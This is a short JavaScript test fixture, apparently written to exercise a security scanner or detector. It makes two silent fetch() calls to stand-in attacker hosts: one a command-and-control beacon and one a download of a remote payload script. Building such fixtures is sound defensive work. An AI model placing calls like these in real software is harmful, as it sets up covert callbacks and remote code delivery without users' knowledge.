// Fixture: beacons to a remote host and pulls remote code.
fetch("https://c2.evil.test/beacon").catch(() => {});
fetch("https://cdn.evil.test/payload.js").catch(() => {});
